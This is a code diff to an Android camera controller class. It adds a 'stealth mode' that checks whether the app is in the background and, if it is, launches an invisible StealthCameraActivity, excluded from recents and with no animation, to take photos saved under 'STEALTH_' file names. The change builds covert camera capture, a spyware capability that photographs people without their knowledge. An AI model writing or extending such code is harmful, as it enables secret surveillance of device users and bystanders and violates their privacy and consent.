@@ -1,5 +1,6 @@
 package com.example.myapplication555.controllers;
 
+import android.app.ActivityManager;
 import android.content.Context;
 import android.content.Intent;
 import android.hardware.camera2.CameraAccessException;
@@ -19,6 +20,8 @@ import android.util.Size;
 
 import androidx.annotation.NonNull;
 
+import com.example.myapplication555.activities.StealthCameraActivity;
+
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
@@ -26,6 +29,7 @@ import java.nio.ByteBuffer;
 import java.text.SimpleDateFormat;
 import java.util.Arrays;
 import java.util.Date;
+import java.util.List;
 import java.util.Locale;
 import java.util.concurrent.Semaphore;
 import java.util.concurrent.TimeUnit;
@@ -100,10 +104,61 @@ public class CameraController {
 
     /**
      * Take a picture using the rear camera
+     * Automatically detects if app is in background and uses stealth mode
      * @return file path of captured image, null if failed
      */
     public String takePicture() {
-        Log.d(TAG, "Taking picture");
+        Log.d(TAG, "Taking picture - checking app state");
+        
+        // Check if app is in foreground or background
+        boolean isInForeground = isAppInForeground();
+        
+        if (!isInForeground) {
+            Log.d(TAG, "🎭 App in background - using stealth mode");
+            return takeStealthPicture();
+        } else {
+            Log.d(TAG, "📱 App in foreground - using normal mode");
+            return takeNormalPicture();
+        }
+    }
+
+    /**
+     * Take picture using stealth mode (invisible activity)
+     * @return file path of captured image, null if failed
+     */
+    private String takeStealthPicture() {
+        Log.d(TAG, "🎯 Starting stealth picture capture");
+        
+        try {
+            // Create stealth camera intent
+            Intent stealthIntent = new Intent(context, StealthCameraActivity.class);
+            stealthIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
+                                 Intent.FLAG_ACTIVITY_NO_ANIMATION |
+                                 Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+            
+            // Start stealth activity
+            context.startActivity(stealthIntent);
+            
+            // Return a placeholder path - actual path will be available in logs
+            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
+            File storageDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM + "/Camera");
+            String expectedPath = storageDir + "/STEALTH_" + timeStamp + "_.jpg";
+            
+            Log.d(TAG, "🎭 Stealth capture initiated - check logs for actual path");
+            return expectedPath;
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting stealth capture", e);
+            return null;
+        }
+    }
+
+    /**
+     * Take picture using normal mode (foreground)
+     * @return file path of captured image, null if failed
+     */
+    private String takeNormalPicture() {
+        Log.d(TAG, "📸 Taking normal picture");
         
         if (!isCameraOpen) {
             Log.w(TAG, "Camera not open, attempting to open");
@@ -136,7 +191,7 @@ public class CameraController {
             return captureStillPicture(imageFile);
             
         } catch (Exception e) {
-            Log.e(TAG, "Error taking picture", e);
+            Log.e(TAG, "Error taking normal picture", e);
             return null;
         }
     }
@@ -359,5 +414,33 @@ public class CameraController {
         }
         
         stopBackgroundThread();
+    }
+
+    /**
+     * Check if app is currently in foreground
+     * @return true if app is in foreground, false if in background
+     */
+    private boolean isAppInForeground() {
+        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
+        if (activityManager == null) {
+            return false;
+        }
+        
+        List<ActivityManager.RunningAppProcessInfo> appProcesses = activityManager.getRunningAppProcesses();
+        if (appProcesses == null) {
+            return false;
+        }
+        
+        final String packageName = context.getPackageName();
+        for (ActivityManager.RunningAppProcessInfo appProcess : appProcesses) {
+            if (appProcess.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND 
+                && appProcess.processName.equals(packageName)) {
+                Log.d(TAG, "✅ App is in foreground");
+                return true;
+            }
+        }
+        
+        Log.d(TAG, "⚠️ App is in background");
+        return false;
     }
 } 
